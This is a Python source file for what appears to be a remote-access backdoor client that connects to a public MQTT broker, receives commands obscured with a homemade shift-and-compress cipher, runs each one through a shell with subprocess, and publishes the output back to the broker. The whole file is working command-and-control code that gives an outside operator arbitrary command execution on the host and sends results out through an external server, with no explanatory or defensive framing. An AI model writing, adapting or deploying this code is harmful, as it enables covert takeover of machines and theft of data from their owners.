import zlib
from base64 import urlsafe_b64encode as b64e, urlsafe_b64decode as b64d
import random
import os, subprocess
from paho.mqtt import client as mqtt_client


broker = 'broker.emqx.io'
port = 1883
topic = "5A7134743777217A25432A462D4A614E"
client_id = f'client-{random.randint(0, 10000000)}'
username = 'emqx'
password = 'public'

global encryption_key, prev_key

encryption_key = 'JaNcRfUjXn2r5u8x/A?D(G+KbPeSgVkY'
prev_key = encryption_key

def shift_by(str1, str2):
    coll = []
    for i in range(len(str1)):
        char = chr(ord(str1[i]) << int(ord(str2[i%len(str2)])%8))
        coll.append(char)
    return b64e(zlib.compress(''.join(coll).encode(), 9)).decode()

def reverse_shift(str1, str2):
    try:
        str1 = zlib.decompress(b64d(str1)).decode()
        coll = []
        for i in range(len(str1)):
            char = chr(ord(str1[i]) >> int(ord(str2[i%len(str2)])%8))
            coll.append(char)
        return ''.join(coll)
    except: return 'Incorrect padding for base64.'


def connect_mqtt() -> mqtt_client:
    def on_connect(client, userdata, flags, rc):
        subscribe(client)
        if rc == 0:
            print("Connected to MQTT Broker!")
        else: print("Failed to connect, return code %d\n", rc)
        
    def on_reconnect(client, userdata, flags, rc):
        subscribe(client)
        if rc == 0: print("Reconnected to MQTT Broker!")
        else: print("Failed to connect, return code %d\n", rc)
    

    client = mqtt_client.Client(client_id)
    client.username_pw_set(username, password)
    client.on_connect = on_connect
    client.on_reconnect = on_reconnect
    client.connect(broker, port)
    return client


def subscribe(client: mqtt_client):
    def on_message(client, userdata, msg):
        global encryption_key, prev_key, client_id
        payload = reverse_shift(msg.payload.decode(), encryption_key)
        if not payload.startswith('server: '):
            if payload.startswith('client: '):
                print(payload)
        else:
            print(payload)
            check = payload.split('server: ')[-1].strip()
            if check == 'list connections':
                client.publish(topic, shift_by(client_id+' connected.', encryption_key))
                return
            if check.startswith('cli:') and check.split('€')[0].split('cli:')[1].strip()==client_id.split('-')[1]:
                encryption_key = check.split('€')[-1].strip()
            elif check == 'release':
                encryption_key = prev_key
            try: result = subprocess.run(payload.split('server: ')[-1], shell=True, capture_output = True, stdin=subprocess.DEVNULL, encoding="utf-8").stdout
            except: result = ''
            if result != '':
                try: client.publish(topic, shift_by('client: '+result, encryption_key))
                except: pass
            else: client.publish(topic, shift_by('client:  '+result, encryption_key))

    client.subscribe(topic)
    client.on_message = on_message


def run():
    client = connect_mqtt()
    subscribe(client)
    client.publish(topic, shift_by(client_id+' connected.', encryption_key))
    client.loop_forever()


if __name__ == '__main__':
    run()
